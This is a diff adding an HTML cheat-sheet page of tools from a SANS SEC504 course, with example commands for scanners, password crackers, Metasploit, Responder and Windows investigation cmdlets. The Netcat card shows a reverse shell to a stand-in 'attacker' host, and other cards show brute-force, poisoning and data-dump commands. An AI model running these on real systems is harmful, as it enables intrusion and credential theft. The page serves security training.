@@ -1,0 +1,488 @@
+<title>Hacker Tools Overview</title>
+<style>
+  /* Layout: sticky toolbar (title + search + capped tag filters) over a scrolling column of tool cards */
+  :root {
+    font-size: 115%;            /* ~15% larger base so every rem scales up for readability */
+    --bg: #f4f5f7;
+    --surface: #ffffff;
+    --surface-2: #eef0f3;
+    --fg: #15181d;
+    --muted: #5b6472;
+    --border: #d9dde4;
+    --accent: #1f6feb;
+    --accent-soft: #e4edfb;
+    --code-bg: #14171c;
+    --code-fg: #e6edf3;
+    --code-prompt: #4ec9b0;
+    --code-gui: #d7a85f;
+    --code-comment: #8b97a6;
+    --mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    --sans: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0d1017;
+      --surface: #161b22;
+      --surface-2: #1c222b;
+      --fg: #e6edf3;
+      --muted: #9aa5b1;
+      --border: #2a313c;
+      --accent: #4e9bff;
+      --accent-soft: #15314f;
+      --code-bg: #0a0c10;
+      --code-fg: #e6edf3;
+      --code-prompt: #4ec9b0;
+      --code-gui: #d7a85f;
+      --code-comment: #8b97a6;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0d1017;
+    --surface: #161b22;
+    --surface-2: #1c222b;
+    --fg: #e6edf3;
+    --muted: #9aa5b1;
+    --border: #2a313c;
+    --accent: #4e9bff;
+    --accent-soft: #15314f;
+    --code-bg: #0a0c10;
+    --code-fg: #e6edf3;
+    --code-prompt: #4ec9b0;
+    --code-gui: #d7a85f;
+    --code-comment: #8b97a6;
+    color-scheme: dark;
+  }
+
+  * { box-sizing: border-box; }
+  body { background: var(--bg); color: var(--fg); font-family: var(--sans); line-height: 1.5; }
+
+  .wrap { max-width: 1040px; margin: 0 auto; padding-inline: 16px; padding-block: 0 56px; }
+
+  header.bar {
+    position: sticky;
+    top: env(safe-area-inset-top, 0px);
+    z-index: 20;
+    background: color-mix(in srgb, var(--bg) 92%, transparent);
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--border);
+  }
+  .bar-inner { max-width: 1040px; margin: 0 auto; padding: 16px; display: flex; flex-direction: column; gap: 12px; }
+  .titlerow { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+  h1 { font-size: 1.4rem; font-weight: 700; margin: 0; letter-spacing: -0.01em; }
+  h1 .tag-term { color: var(--accent); }
+  .titlegroup { display: flex; align-items: baseline; gap: 8px; flex-wrap: wrap; min-width: 0; }
+  .updated { font-size: 0.76rem; color: var(--muted); }
+  .counts { font-family: var(--mono); font-size: 0.8rem; color: var(--muted); white-space: nowrap; }
+
+  .searchrow { position: relative; display: flex; }
+  #search {
+    width: 100%; font-family: var(--sans); font-size: 0.76rem;
+    padding: 11px 40px 11px 14px; border-radius: 9px;
+    border: 1px solid var(--border); background: var(--surface); color: var(--fg);
+  }
+  #search:focus { outline: 2px solid var(--accent); outline-offset: 1px; border-color: var(--accent); }
+  .searchrow .mag { position: absolute; right: 13px; top: 50%; transform: translateY(-50%); color: var(--muted); font-size: 1.5rem; pointer-events: none; }
+  .searchrow .clearbtn {
+    position: absolute; right: 38px; top: 50%; transform: translateY(-50%);
+    border: none; background: var(--surface-2); color: var(--muted);
+    width: 24px; height: 24px; border-radius: 50%; cursor: pointer; font-size: 0.9rem; line-height: 1;
+  }
+  .searchrow .clearbtn:hover { color: var(--fg); }
+
+  .tagbar { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
+  .chip {
+    font-family: var(--mono); font-size: 0.76rem; letter-spacing: 0.02em;
+    padding: 5px 10px; border-radius: 999px; cursor: pointer; user-select: none;
+    border: 1px solid var(--border); background: var(--surface); color: var(--muted);
+    transition: background .12s, color .12s, border-color .12s;
+  }
+  .chip:hover { color: var(--fg); border-color: var(--accent); }
+  .chip[aria-pressed="true"] { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .chip .n { opacity: 0.65; margin-left: 4px; }
+  .chip.more { font-weight: 700; letter-spacing: 0.06em; background: var(--surface-2); font-size: 1.05rem; padding: 5px 12px; display: inline-flex; align-items: center; justify-content: center; }
+  .chip.more span.dots { display: block; line-height: 1; transform: translateY(-0.18em); }
+  .chip.more:hover { color: var(--fg); }
+
+  main { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
+
+  .card {
+    background: var(--surface); border: 1px solid var(--border); border-radius: 12px;
+    padding: 16px 18px; min-width: 0;
+  }
+  .card-head { display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; }
+  .idx { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); font-variant-numeric: tabular-nums; }
+  .name { font-family: var(--mono); font-size: 1.08rem; font-weight: 600; color: var(--fg); }
+  .desc { margin: 8px 0 12px; color: var(--muted); font-size: 0.94rem; max-width: 70ch; }
+  .card-tags { display: flex; flex-wrap: wrap; gap: 5px; align-items: center; margin-bottom: 12px; }
+  .ctag {
+    font-family: var(--mono); font-size: 0.72rem; padding: 2px 8px; border-radius: 5px;
+    background: var(--accent-soft); color: var(--accent); cursor: pointer; border: none;
+  }
+  .ctag:hover { filter: brightness(1.05); text-decoration: underline; }
+
+  .cmds { background: var(--code-bg); border-radius: 8px; padding: 11px 13px; overflow-x: auto; }
+  .cmds ul { margin: 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: 7px; }
+  .cmds li { display: flex; flex-wrap: wrap; align-items: baseline; gap: 4px 12px; }
+  .cmds .c { font-family: var(--mono); font-size: 0.85rem; color: var(--code-fg); white-space: pre; }
+  .cmds .pr { color: var(--code-prompt); }
+  .cmds .pr.g { color: var(--code-gui); }
+  .cmds .cm { font-family: var(--sans); font-size: 0.8rem; color: var(--code-comment); }
+  .cmds .cm::before { content: "# "; opacity: 0.6; }
+
+  details.flags { margin-top: 10px; border: 1px solid var(--border); border-radius: 8px; background: var(--surface-2); }
+  details.flags > summary {
+    cursor: pointer; list-style: none; padding: 10px 13px;
+    font-size: 0.88rem; font-weight: 600; color: var(--fg);
+    display: flex; align-items: center; justify-content: space-between; gap: 8px;
+  }
+  details.flags > summary::-webkit-details-marker { display: none; }
+  details.flags > summary .sum-left { display: flex; align-items: baseline; gap: 8px; min-width: 0; }
+  details.flags > summary .lbl-count { color: var(--muted); font-weight: 400; font-size: 0.8rem; }
+  details.flags > summary .caret { color: var(--accent); font-size: 1.44rem; line-height: 1; transition: transform .15s; flex: none; }
+  details.flags[open] > summary .caret { transform: rotate(180deg); }
+  .flagtable { padding: 0 13px 13px; display: grid; grid-template-columns: max-content 1fr; gap: 5px 14px; align-items: baseline; }
+  .flagtable dt { font-family: var(--mono); font-size: 0.82rem; color: var(--accent); white-space: nowrap; }
+  .flagtable dd { margin: 0; font-size: 0.86rem; color: var(--muted); min-width: 0; }
+  @media (max-width: 460px) {
+    .flagtable { grid-template-columns: 1fr; gap: 1px 0; }
+    .flagtable dd { margin-bottom: 7px; }
+  }
+
+  mark { background: #ffe066; color: #15181d; border-radius: 2px; padding: 0 1px; }
+
+  .empty { text-align: center; color: var(--muted); padding: 48px 16px; font-size: 1rem; }
+
+  footer { margin-top: 28px; color: var(--muted); font-size: 0.82rem; line-height: 1.6; max-width: 72ch; }
+  footer .legend { font-family: var(--mono); font-size: 0.76rem; }
+</style>
+
+<header class="bar">
+  <div class="bar-inner">
+    <div class="titlerow">
+      <div class="titlegroup">
+        <h1>Hacker Tools Overview <span class="tag-term">· SANS SEC504</span></h1>
+        <span class="updated">(last updated on 9 oct 26)</span>
+      </div>
+      <span class="counts" id="counts"></span>
+    </div>
+    <div class="searchrow">
+      <span class="mag">⌕</span>
+      <input id="search" type="text" placeholder="search by name or tags" autocomplete="off" spellcheck="false" aria-label="Search by name or tags">
+      <button class="clearbtn" id="clear" hidden aria-label="Clear search">✕</button>
+    </div>
+    <div class="tagbar" id="tagbar"></div>
+  </div>
+</header>
+
+<div class="wrap">
+  <main id="list"></main>
+  <div class="empty" id="empty" hidden>No tools match. Try another name or clear the filters.</div>
+  <footer>
+    <p class="legend"><strong>$</strong> command-line usage &nbsp;·&nbsp; <strong>»</strong> GUI action</p>
+    <p>Tools and techniques from the current SANS SEC504 (<em>Hacker Tools, Techniques, and Incident Handling</em>) syllabus. These are legitimate, publicly documented security tools for authorized testing, incident response, and defense — use them only on systems you own or have written permission to test. Example commands and descriptions reflect standard documented usage, not SANS courseware.</p>
+  </footer>
+</div>
+
+<script>
+// ---- favicon: the "Terminal" mark, in the SANS SEC504 accent scheme ----
+(function(){
+  const svg = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'>"
+    + "<rect x='2' y='2' width='60' height='60' rx='14' fill='%230d1017' stroke='%231f6feb' stroke-width='2.5'/>"
+    + "<path d='M18 22 L30 32 L18 42' fill='none' stroke='%231f6feb' stroke-width='5' stroke-linecap='round' stroke-linejoin='round'/>"
+    + "<rect x='34' y='39' width='14' height='4.5' rx='2.25' fill='%23e6edf3'/></svg>";
+  try {
+    const link = document.createElement('link');
+    link.rel = 'icon';
+    link.type = 'image/svg+xml';
+    link.href = 'data:image/svg+xml,' + svg;
+    document.head.appendChild(link);
+  } catch(e) {}
+})();
+
+// Each command is [commandText, briefExplanation]; a "»" prefix marks a GUI action.
+const TOOLS = [
+  { name: "Nmap", tags: ["Reconnaissance","Scanning","Enumeration"],
+    desc: "Network and host scanner for host enumeration, discovery, and deep assessment via the Nmap Scripting Engine. Maps live hosts, open ports, and running services.",
+    cmds: [["nmap -sS 10.0.0.0/24","Stealthy SYN scan of a whole /24 subnet"],["nmap -sV -p 1-65535 target","Version-detect every port on the target"],["nmap -A -T4 target","Aggressive, faster all-in-one scan"],["nmap --script smb-enum-shares -p445 target","Enumerate SMB shares with an NSE script"],["nmap -Pn -sn 192.168.1.0/24","Find live hosts without a ping or port scan"]],
+    flags: [["-sS","Stealthy SYN scan — probes ports without finishing the full handshake."],["-sV","Detect the service and version running on each open port."],["-p","Which port(s) to scan (e.g. 445, or 1-65535 for all)."],["-A","Aggressive scan: OS detection, version, scripts, and traceroute at once."],["-T4","Speed/timing preset — higher is faster but noisier (0 slow … 5 fast)."],["--script","Run a Nmap Scripting Engine (NSE) script for deeper checks."],["-Pn","Skip the ping check and treat every host as online."],["-sn","Ping sweep only — find live hosts without scanning ports."],["/24","CIDR notation for an address range (/24 = 256 addresses)."]] },
+
+  { name: "Masscan", tags: ["Reconnaissance","Scanning","Cloud"],
+    desc: "High-speed mass port scanner used to accelerate scans and discover shadow cloud assets across very large address ranges.",
+    cmds: [["masscan 10.0.0.0/8 -p80,443","Sweep a huge range for web ports"],["masscan 0.0.0.0/0 -p443 --rate 10000","Internet-wide HTTPS scan at 10k packets/sec"],["masscan 192.168.0.0/16 -p1-65535 -oL out.txt","All ports on a /16, saved to a file"],["masscan --range 10.0.0.0/24 -p22 --banners","Find SSH hosts and grab their banners"],["masscan -iL targets.txt -p3389","Scan RDP on hosts listed in a file"]],
+    flags: [["-p","Port or port list to scan (e.g. 80,443 or 1-65535)."],["--rate","Packets sent per second — how fast (and how loud) the scan is."],["-oL","Write results to a file in simple list format."],["--range","Specify the target address range explicitly."],["--banners","Grab the service banner from open ports for identification."],["-iL","Read the list of targets from a file."]] },
+
+  { name: "EyeWitness", tags: ["Reconnaissance","Enumeration"],
+    desc: "Reconnaissance tool that captures screenshots of web targets to quickly visualize and triage discovered hosts.",
+    cmds: [["eyewitness --web -f urls.txt","Screenshot every URL in the file"],["eyewitness --web --single https://target","Screenshot a single site"],["eyewitness -x nmap.xml --web","Pull targets straight from Nmap results"],["eyewitness -f hosts.txt -d report/","Save screenshots and report to a folder"],["eyewitness --web --threads 10 -f urls.txt","Run 10 captures in parallel"]],
+    flags: [["--web","Treat targets as websites and screenshot them."],["-f","Read targets from a file, one per line."],["--single","Capture just one URL instead of a list."],["-x","Import targets from an Nmap XML results file."],["-d","Folder to save the screenshots and HTML report into."],["--threads","How many targets to process in parallel."]] },
+
+  { name: "Netcat", tags: ["Pivoting","C2","Post-Exploitation","Utility"],
+    desc: "Multi-purpose networking utility used for data exfiltration, pivoting, and setting up listeners and reverse-TCP backdoors on Linux and Windows.",
+    cmds: [["nc -lvnp 4444","Open a verbose listener on port 4444"],["nc target 80","Connect to a host's web port"],["nc -e /bin/bash attacker 4444","Reverse shell back to the attacker"],["nc -lvp 9001 > received.file","Receive a file over the network"],["nc -zv target 1-1000","Quick port scan of ports 1–1000"]],
+    flags: [["-l","Listen for an incoming connection instead of making one."],["-v","Verbose — print connection details as they happen."],["-n","Skip DNS lookups and use raw IP addresses only."],["-p","The port to listen on or connect from."],["-e","Run a program (e.g. a shell) and wire it to the connection — this is what makes a backdoor."],["-z","Zero-data mode: just check if ports are open (simple port scan)."]] },
+
+  { name: "Hayabusa", tags: ["Defense","Log Analysis","Threat Hunting"],
+    desc: "Defensive tool that parses Windows Event Logs and applies Sigma rules to identify attacks and threat-hunt.",
+    cmds: [["hayabusa csv-timeline -d ./logs -o out.csv","Build a timeline from a folder of logs"],["hayabusa csv-timeline -f Security.evtx -o out.csv","Analyze a single event-log file"],["hayabusa update-rules","Download the latest Sigma rules"],["hayabusa csv-timeline -d logs --min-level high","Report only high-severity alerts"],["hayabusa level-tuning","Tune the severity levels of rules"]],
+    flags: [["csv-timeline","Command that builds a timeline of flagged events as a CSV."],["-d","Scan a whole directory of .evtx log files."],["-o","Output file to write results to."],["-f","Scan a single .evtx log file."],["update-rules","Download the latest Sigma detection rules."],["--min-level","Only report alerts at or above this severity (e.g. high)."],["level-tuning","Adjust the severity levels assigned to rules."]] },
+
+  { name: "SMBeagle", tags: ["Reconnaissance","Enumeration","SMB"],
+    desc: "Scans and enumerates SMB file shares across a network to find exposed and accessible data.",
+    cmds: [["SMBeagle -c out.csv -d 10.0.0.0/24","Map shares across a subnet to CSV"],["SMBeagle -c out.csv -D target","Scan a single host's shares"],["SMBeagle -c out.csv -u user -p pass -d 10.0.0.0/16","Authenticated share scan of a /16"],["SMBeagle -e elastic.host -d 192.168.1.0/24","Send findings to an Elasticsearch host"],["SMBeagle -c results.csv --verbose -d target","Verbose scan of one target"]],
+    flags: [["-c","Write the findings to a CSV file."],["-d","Scan a network range for SMB shares."],["-D","Scan a single host."],["-u / -p","Username and password to authenticate with."],["-e","Send results to an Elasticsearch host instead of a file."],["--verbose","Print more detail while scanning."]] },
+
+  { name: "Legba", tags: ["Password Attacks"],
+    desc: "Fast, multi-protocol credential brute-forcing tool used for password guessing and spray attacks.",
+    cmds: [["legba ssh --target host --username admin --password wordlist.txt","Brute-force one SSH account"],["legba http --target https://site/login --username-list users.txt --password-list pw.txt","Spray a web login form"],["legba rdp --target host -U admin -P pw.txt","Guess an RDP password"],["legba smb --target host --username admin --password-list pw.txt","Brute-force SMB credentials"],["legba ftp --target host -U users.txt -P pw.txt","Spray FTP logins"]],
+    flags: [["ssh/http/rdp/smb/ftp","The protocol plugin to attack — pick the service you're testing."],["--target","The host or URL to attack."],["--username / -U","A single username, or a file of usernames to try."],["--password / -P","A single password, or a wordlist file to try."],["--username-list","File containing many usernames (for spray attacks)."],["--password-list","File containing many passwords to test."]] },
+
+  { name: "Hashcat", tags: ["Password Attacks","Cracking"],
+    desc: "GPU-accelerated password-cracking tool that recovers plaintext from hashes, with support for policy masks and rule-based attacks.",
+    cmds: [["hashcat -m 1000 hashes.txt rockyou.txt","Crack Windows NTLM hashes with a wordlist"],["hashcat -m 0 -a 0 hashes.txt wordlist.txt","Dictionary attack against MD5 hashes"],["hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?d?d?d?d","Brute-force a known password pattern"],["hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule","Wordlist plus mutation rules"],["hashcat -m 1000 hashes.txt --show","Show passwords already cracked"]],
+    flags: [["-m","Hash type to crack (0 = MD5, 1000 = Windows NTLM, etc.)."],["-a","Attack mode (0 = wordlist, 3 = brute-force mask)."],["?u ?l ?d","Mask placeholders — uppercase, lowercase, digit — to model a password pattern."],["-r","Apply a rules file that mutates each word (add numbers, swap case…)."],["--show","Display passwords already cracked for these hashes."]] },
+
+  { name: "Metasploit Framework", tags: ["Exploitation","C2","Post-Exploitation","Persistence"],
+    desc: "Exploitation framework used to identify, configure, and deliver exploits and payloads, and to establish Command & Control for post-exploitation and persistence.",
+    cmds: [["msfconsole","Launch the Metasploit console"],["search type:exploit smb","Find available SMB exploits"],["use exploit/windows/smb/ms17_010_eternalblue","Select the EternalBlue exploit"],["set RHOSTS 10.0.0.5   # then: exploit","Set the target, then fire"],["sessions -i 1","Interact with the session you gained"]],
+    flags: [["msfconsole","Launch the main Metasploit console."],["search","Find modules by keyword (e.g. type:exploit smb)."],["use","Select a module to work with."],["set","Set an option for the selected module."],["RHOSTS","The remote target host(s) option."],["exploit","Run the selected exploit against the target."],["sessions -i","Interact with an active session by its number."]] },
+
+  { name: "Ffuf", tags: ["Web Attacks","Enumeration"],
+    desc: "Web fuzzer used for forced browsing — discovering hidden directories, files, and endpoints on web applications.",
+    cmds: [["ffuf -w wordlist.txt -u https://target/FUZZ","Brute-force hidden paths and files"],["ffuf -w list.txt -u https://target/FUZZ -mc 200,301","Keep only 200/301 responses"],["ffuf -w params.txt -u https://target/page?FUZZ=val","Fuzz for valid parameter names"],["ffuf -w vhosts.txt -u https://target -H \"Host: FUZZ\"","Discover hidden virtual hosts"],["ffuf -w list.txt -u https://target/FUZZ -e .php,.bak","Try several file extensions"]],
+    flags: [["-w","Wordlist of candidate names to try."],["-u","Target URL containing the FUZZ keyword."],["FUZZ","Placeholder marking where each wordlist entry is inserted."],["-mc","Only show responses with these HTTP status codes."],["-H","Add or override an HTTP header (FUZZ works here too)."],["-e","Append file extensions to each word (e.g. .php, .bak)."]] },
+
+  { name: "Sqlmap", tags: ["Web Attacks","Cloud"],
+    desc: "Automated SQL injection tool that discovers and exploits database vulnerabilities to extract data, including against cloud databases.",
+    cmds: [["sqlmap -u \"https://target/page?id=1\"","Test a parameter for SQL injection"],["sqlmap -u \"https://target/?id=1\" --dbs","List the databases on the server"],["sqlmap -u \"https://target/?id=1\" -D dbname --tables","List tables in a chosen database"],["sqlmap -r request.txt --batch","Test a saved request automatically"],["sqlmap -u \"https://target/?id=1\" --dump","Extract and dump the data"]],
+    flags: [["-u","Target URL with the parameter to test."],["--dbs","List the databases found on the server."],["-D","Select a specific database to work in."],["--tables","List the tables in the chosen database."],["-r","Load a saved HTTP request from a file to test."],["--batch","Run non-interactively, accepting default answers."],["--dump","Extract and print the data from the target."]] },
+
+  { name: "Bruno", tags: ["Web Attacks","API"],
+    desc: "API client used to explore, enumerate, and exploit RESTful API endpoints and their vulnerabilities.",
+    cmds: [["bru run request.bru","Run a single saved request"],["bru run ./collection --env prod","Run a collection against the prod environment"],["bru run api-tests/ -r","Run every request recursively"],["» Create collection → import OpenAPI spec","Auto-load every endpoint from a spec"],["» Set bearer token in environment vars","Reuse an auth token across requests"]],
+    flags: [["bru run","Run a saved request or a whole collection from the CLI."],["--env","Use a named environment (its URLs, tokens, variables)."],["-r","Run requests recursively through sub-folders."],["» import OpenAPI","Load an API's spec to auto-populate every endpoint."],["» bearer token","Store an auth token as a variable reused across requests."]] },
+
+  { name: "Kiterunner", tags: ["Web Attacks","API","Enumeration","Reconnaissance"],
+    desc: "Content-discovery tool built specifically for finding API endpoints and routes. Unlike a plain directory brute-forcer, it replays realistic request method/path/header/body combinations from large route wordlists to uncover hidden API paths.",
+    cmds: [["kr scan https://target -w routes.kite","Discover API routes against one host"],["kr scan targets.txt -w routes-large.kite","Scan many hosts from a file"],["kr brute https://target -w wordlist.txt","Brute-force paths from a plain wordlist"],["kr scan https://target -A=apiroutes-220828 -x 20","Use a built-in route set, 20 parallel connections"],["kr kb list","List the downloadable route-set 'kitebuilder' wordlists"]],
+    flags: [["scan","Replay full request templates (method, path, headers, body) from a .kite file."],["brute","Simpler mode that fuzzes paths from an ordinary wordlist."],["-w","The route wordlist to use (.kite compiled set, or a text list)."],["-A","Pick a built-in assetnote route set by name (e.g. apiroutes-220828)."],["-x","Maximum parallel connections per host — tunes speed."],["kb list","List the available kitebuilder route-set wordlists to download."]] },
+
+  { name: "Responder", tags: ["Credential Harvesting","Lateral Movement"],
+    desc: "LAN attack tool that exploits default Windows name-resolution protocols to poison responses and harvest credentials as a network insider.",
+    cmds: [["responder -I eth0","Start poisoning name-resolution on eth0"],["responder -I eth0 -wF","Run the rogue WPAD proxy and force auth"],["responder -I eth0 -A","Passive analyze mode — watch, don't poison"],["responder -I eth0 -r -d -w","Respond broadly to name queries"],["responder -I eth0 --lm","Force weak LM hashes for easier cracking"]],
+    flags: [["-I","The network interface to listen and respond on."],["-w","Start the rogue WPAD proxy to capture web auth."],["-F","Force authentication for the WPAD request."],["-A","Analyze mode — watch passively without poisoning."],["-r","Respond to NetBIOS workstation-name queries."],["-d","Answer domain-suffix name lookups."],["--lm","Force the weaker LM hash to make cracking easier."]] },
+
+  { name: "RegShot", tags: ["Malware Analysis"],
+    desc: "Snapshot utility used in malware analysis to compare the Windows registry and file system before and after a sample executes.",
+    cmds: [["» Click 1st shot → run sample → 2nd shot","Capture state before and after running the sample"],["» Click Compare to generate the diff","Reveal exactly what changed"],["» Enable Scan dir e.g. C:\\","Also watch the file system, not just the registry"],["» Set output format to HTML","Produce a readable report"],["» Save comparison report","Export the findings"]],
+    flags: [["1st shot","Capture the clean baseline of registry and files before running the sample."],["2nd shot","Capture the state again after the malware runs."],["Compare","Diff the two snapshots to reveal exactly what changed."],["Scan dir","Also watch a folder on disk, not just the registry."],["Output HTML","Save the comparison as a readable HTML report."]] },
+
+  { name: "Procmon", tags: ["Malware Analysis","Live Investigation"],
+    desc: "Sysinternals tool that records real-time file, registry, process, and network activity to inspect malware behavior.",
+    cmds: [["» Filter: Process Name is malware.exe","Narrow events down to one process"],["» Filter: Operation is RegSetValue","Show only registry writes"],["Procmon.exe /BackingFile log.pml","Log captured events to disk"],["Procmon.exe /Quiet /Minimized","Start capturing silently"],["» Tools → Process Tree","See parent/child process lineage"]],
+    flags: [["Filter: Process Name","Narrow the firehose of events to one process."],["Filter: Operation","Show only one kind of action (e.g. registry writes)."],["/BackingFile","Write captured events to a log file instead of memory."],["/Quiet","Skip the startup confirmation prompt."],["/Minimized","Start capturing with the window minimized."],["Process Tree","See the parent/child relationships between processes."]] },
+
+  { name: "Get-Process", tags: ["Live Investigation","Threat Hunting","PowerShell"],
+    desc: "PowerShell cmdlet listing running processes; used to spot suspicious or unsigned processes and their resource use.",
+    cmds: [["Get-Process","List every running process"],["Get-Process | Sort-Object CPU -Descending","Find the heaviest CPU users"],["Get-Process -Name powershell","Show only PowerShell processes"],["Get-Process | Where-Object { $_.Path -notlike \"C:\\Windows\\*\" }","Flag processes running outside Windows"],["Get-Process | Select-Object Name, Id, Path","Show name, PID and path"]],
+    flags: [["|","The pipeline — passes results from one cmdlet into the next."],["Sort-Object -Descending","Order results by a property, largest first."],["-Name","Filter to processes with a given name."],["Where-Object { … }","Keep only rows matching a condition."],["$_","The current item being evaluated in the pipeline."],["-notlike","Pattern match that excludes (here, paths outside C:\\Windows)."],["Select-Object","Choose which properties/columns to show."]] },
+
+  { name: "Get-CimInstance", tags: ["Live Investigation","PowerShell"],
+    desc: "Queries WMI/CIM classes for deep system detail — process command lines, services, startup items — key for spotting fileless and persistence activity.",
+    cmds: [["Get-CimInstance Win32_Process | Select Name, ProcessId, CommandLine","See processes with full command lines"],["Get-CimInstance Win32_Service","List installed services"],["Get-CimInstance Win32_StartupCommand","List programs set to run at startup"],["Get-CimInstance Win32_LogonSession","List active logon sessions"],["Get-CimInstance -ClassName Win32_OperatingSystem","Show OS details"]],
+    flags: [["Win32_Process","Class exposing processes plus their full command lines."],["Win32_Service","Class listing installed services."],["Win32_StartupCommand","Class listing programs set to run at startup."],["Win32_LogonSession","Class listing active logon sessions."],["-ClassName","Explicitly name the WMI/CIM class to query."],["Select","Pick which properties to display (e.g. CommandLine)."]] },
+
+  { name: "Get-NetTCPConnection", tags: ["Live Investigation","Network Investigation","PowerShell"],
+    desc: "Shows active TCP connections and listening ports; used to find beaconing, backdoor listeners, and unexpected remote connections.",
+    cmds: [["Get-NetTCPConnection","List all TCP connections"],["Get-NetTCPConnection -State Established","Show only live connections"],["Get-NetTCPConnection -State Listen","Show only listening ports"],["Get-NetTCPConnection | Where-Object { $_.RemotePort -eq 4444 }","Hunt a suspicious remote port"],["Get-NetTCPConnection | Select LocalPort, RemoteAddress, RemotePort, OwningProcess","Tie connections to their process"]],
+    flags: [["-State Established","Show only live, open connections."],["-State Listen","Show only ports waiting for incoming connections."],["Where-Object { … }","Filter rows (e.g. a suspicious remote port)."],["RemotePort","The port on the far end of the connection."],["OwningProcess","The process ID that owns the connection — ties traffic to a program."],["Select","Choose which columns to display."]] },
+
+  { name: "Get-Service", tags: ["Live Investigation","Persistence","PowerShell"],
+    desc: "Lists Windows services and their state; used to find malicious or newly added services, a common persistence check.",
+    cmds: [["Get-Service","List all services"],["Get-Service | Where-Object { $_.Status -eq \"Running\" }","Show only running services"],["Get-Service -Name W32Time","Check one specific service"],["Get-Service | Sort-Object Status","Group services by state"],["Get-Service | Export-Clixml baseline.xml","Save a baseline for later diffing"]],
+    flags: [["Where-Object { … }","Keep only services matching a condition (e.g. Running)."],["$_.Status","The current service's state (Running / Stopped)."],["-Name","Filter to a specific service."],["Sort-Object","Order the services by a property."],["Export-Clixml","Save the full objects to a file — used as a baseline for later diffing."]] },
+
+  { name: "Get-ChildItem", tags: ["Live Investigation","PowerShell"],
+    desc: "Lists items in a path — file system or registry; used to enumerate directories, find recently modified files, and inspect autostart keys.",
+    cmds: [["Get-ChildItem C:\\Users -Recurse","List everything under Users"],["Get-ChildItem -Path C:\\ -Filter *.exe -Recurse","Find every executable on the drive"],["Get-ChildItem HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","Read a registry autostart key"],["Get-ChildItem | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) }","Find files changed in the last day"],["Get-ChildItem -Hidden","Include hidden items"]],
+    flags: [["-Recurse","Also descend into every sub-folder."],["-Path","The folder or registry key to list."],["-Filter","Only return items matching a pattern (e.g. *.exe)."],["HKLM:\\…\\Run","A registry autostart key — common persistence location."],["-gt (Get-Date).AddDays(-1)","Condition for 'changed in the last 24 hours'."],["-Hidden","Include hidden items in the listing."]] },
+
+  { name: "Get-ItemProperty", tags: ["Live Investigation","Persistence","PowerShell"],
+    desc: "Reads properties of a file or registry key; used to pull autostart (ASEP) values and file metadata during live examination.",
+    cmds: [["Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","Read machine-wide autostart entries"],["Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","Read per-user autostart entries"],["Get-ItemProperty C:\\path\\file.exe","Read a file's metadata"],["Get-ItemProperty \"HKLM:\\...\\Winlogon\" -Name Shell","Check for a logon-shell hijack"],["Get-ItemProperty HKLM:\\...\\Run | Format-List","Show each value on its own line"]],
+    flags: [["HKLM:\\…\\Run","Machine-wide autostart key (runs for all users)."],["HKCU:\\…\\Run","Current-user autostart key."],["-Name","Read one specific value from the key (e.g. Shell)."],["Winlogon\\Shell","A value hijacked to launch malware at logon."],["Format-List","Display each property on its own line for readability."]] },
+
+  { name: "Get-LocalUser", tags: ["Live Investigation","PowerShell"],
+    desc: "Lists local user accounts; used to detect rogue or backdoor accounts created by an attacker.",
+    cmds: [["Get-LocalUser","List all local accounts"],["Get-LocalUser | Where-Object { $_.Enabled -eq $true }","Show only active accounts"],["Get-LocalUser -Name Administrator","Look up one account"],["Get-LocalUser | Select Name, Enabled, LastLogon","Show key account columns"],["Get-LocalUser | Sort-Object LastLogon -Descending","Most recent logons first"]],
+    flags: [["Where-Object { … }","Filter accounts (e.g. only enabled ones)."],["$_.Enabled","Whether the current account is active."],["-Name","Look up one specific account."],["Select","Choose columns such as Name, Enabled, LastLogon."],["Sort-Object -Descending","Order accounts, most recent logon first."]] },
+
+  { name: "Get-LocalGroup", tags: ["Live Investigation","PowerShell"],
+    desc: "Lists local groups and members (with Get-LocalGroupMember); used to spot unauthorized additions to privileged groups like Administrators.",
+    cmds: [["Get-LocalGroup","List all local groups"],["Get-LocalGroupMember Administrators","See who holds admin rights"],["Get-LocalGroupMember \"Remote Desktop Users\"","See who can log in via RDP"],["Get-LocalGroup | Select Name, Description","Summarize the groups"],["Get-LocalGroupMember Administrators | Select Name, PrincipalSource","Show local vs domain members"]],
+    flags: [["Get-LocalGroupMember","List the accounts inside a given group."],["Administrators","The privileged group attackers most want to join."],["\"Remote Desktop Users\"","Group granting remote-desktop access."],["Select","Choose columns to show (e.g. Name, Description)."],["PrincipalSource","Whether a member is a local or domain account."]] },
+
+  { name: "Get-ScheduledTask", tags: ["Live Investigation","Persistence","PowerShell"],
+    desc: "Enumerates scheduled tasks — a common persistence mechanism — used to find attacker-created or modified tasks.",
+    cmds: [["Get-ScheduledTask","List all scheduled tasks"],["Get-ScheduledTask | Where-Object { $_.State -eq \"Ready\" }","Show only armed (Ready) tasks"],["Get-ScheduledTask -TaskPath \"\\\"","List tasks in the root folder"],["Get-ScheduledTask | Get-ScheduledTaskInfo","Add last/next run times"],["Get-ScheduledTask | Select TaskName, TaskPath, State","Summarize each task"]],
